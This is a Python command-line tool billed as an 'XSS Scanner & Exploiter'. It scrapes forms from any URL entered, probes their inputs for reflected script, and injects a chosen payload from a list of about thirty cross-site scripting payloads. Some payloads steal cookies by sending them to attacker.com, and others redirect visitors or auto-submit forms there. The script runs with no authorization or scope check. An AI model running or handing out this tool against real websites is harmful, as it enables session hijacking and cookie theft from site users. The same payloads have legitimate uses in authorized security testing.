import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import sys


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

payloads = {
    "Simple Alert": "<script>alert('XSS')</script>",
    "Cookie Theft": "<script>document.location='http://attacker.com?c='+document.cookie</script>",
    "Image Upload": "<img src=x onerror=alert('XSS')>",
    "Iframe Injection": "<iframe src='javascript:alert(1)'></iframe>",
    "SVG Injection": "<svg/onload=alert('XSS')>",
    "Event Handler": "\" onmouseover=\"alert('XSS')\"",
    "JS URL": "javascript:alert('XSS')",
    "Body onload": "<body onload=alert('XSS')>",
    "Stored XSS Test": "<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>",
    "HTML Injection": "<h1>XSS</h1>",
    "CSS Injection": "<style>body{background:red;}</style>",
    "Object Tag": "<object data='javascript:alert(1)'></object>",
    "Onfocus": "<input autofocus onfocus=alert('XSS')>",
    "Meta Tag": "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "MathML": "<math><mi xlink:href=\"javascript:alert('XSS')\">X</mi></math>",
    "Template Injection": "{{7*7}}",
    "XML Injection": "<foo>&lt;script&gt;alert('XSS')&lt;/script&gt;</foo>",
    "Polyglot": "';!--\"<XSS>=&{()}",
    "JS Function": "<script>function test(){alert('XSS');} test();</script>",
    "Local Storage": "<script>localStorage.setItem('xss','true')</script>",
    "Session Storage": "<script>sessionStorage.xss=true;</script>",
    "Alert with Confirm": "<script>if(confirm('XSS')) alert('Confirmed')</script>",
    "Alert with Prompt": "<script>prompt('XSS?')</script>",
    "Console Log": "<script>console.log('XSS')</script>",
    "Redirect": "<script>window.location='http://attacker.com'</script>",
    "Form Auto Submit": "<form action='http://attacker.com' method='POST'><input type='submit'></form><script>document.forms[0].submit();</script>",
    "Base Tag": "<base href='javascript:alert(1)//'>",
    "Video Tag": "<video><source onerror=alert('XSS')></video>",
    "Audio Tag": "<audio><source onerror=alert('XSS')></audio>",
    "Object onerror": "<object data='nonexistent' onerror=alert('XSS')></object>",
    "SVG Animate": "<svg><animate attributeName='x' from='0' to='1' dur='0.1s' begin='0s' fill='freeze' onbegin='alert(1)'/></svg>"
}

def is_url_valid(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ["http", "https"], result.netloc])
    except:
        return False

def fetch_forms(url):
    try:
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        return forms
    except Exception as e:
        print(f"{RED}Error fetching the page: {e}{RESET}")
        sys.exit(1)

def extract_form_details(form, url):
    details = {}
    action = form.attrs.get("action", "").strip()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all(["input", "textarea", "select"]):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
    details["action"] = urljoin(url, action)
    details["method"] = method
    details["inputs"] = inputs
    return details

def scan_xss(form_details):
    vulnerable = False
    vulnerable_params = []
    for inp in form_details["inputs"]:
        param = inp["name"]
        payload = "<script>alert('XSS')</script>"
        try:
            if form_details["method"] == "post":
                resp = requests.post(form_details["action"], data={param: payload}, timeout=5)
            else:
                resp = requests.get(form_details["action"], params={param: payload}, timeout=5)
            if payload in resp.text:
                vulnerable = True
                vulnerable_params.append(param)
        except:
            continue
    return vulnerable, vulnerable_params

def exploit_xss(form_details, param, payload):
    print(f"{YELLOW}Injecting payload into '{param}'...{RESET}")
    try:
        if form_details["method"] == "post":
            resp = requests.post(form_details["action"], data={param: payload}, timeout=5)
        else:
            resp = requests.get(form_details["action"], params={param: payload}, timeout=5)
        if payload in resp.text:
            print(f"{GREEN}Payload successfully injected! Potential XSS vulnerability found.{RESET}")
            return True
        else:
            print(f"{RED}Payload injection unsuccessful.{RESET}")
            return False
    except Exception as e:
        print(f"{RED}Request failed: {e}{RESET}")
        return False

def main():
    print(f"""{CYAN}{BOLD}
# -------------------------------------------------------------
# .----------------.  .----------------.  .----------------.
# | .--------------. || .--------------. || .--------------. |
# | |  ____  ____  | || |    _______   | || |    _______   | |
# | | |_  _||_  _| | || |   /  ___  |  | || |   /  ___  |  | |
# | |   \ \  / /   | || |  |  (__ \_|  | || |  |  (__ \_|  | |
# | |    > `' <    | || |   '.___`-.   | || |   '.___`-.   | |
# | |  _/ /'`\ \_  | || |  |`\____) |  | || |  |`\____) |  | |
# | | |____||____| | || |  |_______.'  | || |  |_______.'  | |
# | |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' |
# '----------------'  '----------------'  '----------------'
# PROGRAM
# TELEGRAM: @K_DKP
# GITHUB: toma1264git0hub
# -------------------------------------------------------------{RESET}""")

    print(f"{CYAN}=== XSS Scanner & Exploiter ==={RESET}")
    url = input("URL: ").strip()
    if not is_url_valid(url):
        print(f"{RED}Invalid URL format!{RESET}")
        sys.exit(1)
    forms = fetch_forms(url)
    if not forms:
        print(f"{RED}No forms found on the page.{RESET}")
        sys.exit(0)
    print(f"{GREEN}Found {len(forms)} form(s) on the page.{RESET}")
    form_details_list = [extract_form_details(form, url) for form in forms]
    vulnerable_forms = []
    for idx, details in enumerate(form_details_list, start=1):
        print(f"\n{BOLD}Scanning Form #{idx} for XSS...{RESET}")
        vulnerable, params = scan_xss(details)
        if vulnerable:
            print(f"{GREEN}Potential XSS vulnerability found in form #{idx} on parameters: {params}{RESET}")
            vulnerable_forms.append((idx, details, params))
        else:
            print(f"{RED}No XSS vulnerability found in form #{idx}.{RESET}")
    if not vulnerable_forms:
        print(f"{YELLOW}No XSS vulnerabilities detected on this page.{RESET}")
        sys.exit(0)

    while True:
        try:
            form_choice = int(input(f"Select form to exploit (1-{len(vulnerable_forms)}), or 0 to exit: "))
            if 0 <= form_choice <= len(vulnerable_forms):
                break
            else:
                print(f"{RED}Invalid choice, try again.{RESET}")
        except:
            print(f"{RED}Invalid input, please enter a number.{RESET}")

    if form_choice == 0:
        print("Exiting...")
        sys.exit(0)

    selected_form = vulnerable_forms[form_choice - 1]
    idx, form_details, params = selected_form
    print(f"{CYAN}Selected Form #{idx} for exploitation.{RESET}")

    print(f"{CYAN}Available payloads:{RESET}")
    for i, key in enumerate(payloads.keys(), start=1):
        print(f"{i}. {key}")
    while True:
        try:
            payload_choice = int(input(f"Select payload to inject (1-{len(payloads)}), or 0 to exit: "))
            if 0 <= payload_choice <= len(payloads):
                break
            else:
                print(f"{RED}Invalid choice, try again.{RESET}")
        except:
            print(f"{RED}Invalid input, please enter a number.{RESET}")

    if payload_choice == 0:
        print("Exiting...")
        sys.exit(0)

    payload_key = list(payloads.keys())[payload_choice - 1]
    payload_value = payloads[payload_key]

    print(f"{YELLOW}Injecting payload '{payload_key}'...{RESET}")
    for param in params:
        success = exploit_xss(form_details, param, payload_value)
        if success:
            print(f"{GREEN}Vulnerability confirmed on parameter: {param}{RESET}")
        else:
            print(f"{RED}Failed to exploit parameter: {param}{RESET}")

if __name__ == "__main__":
    main()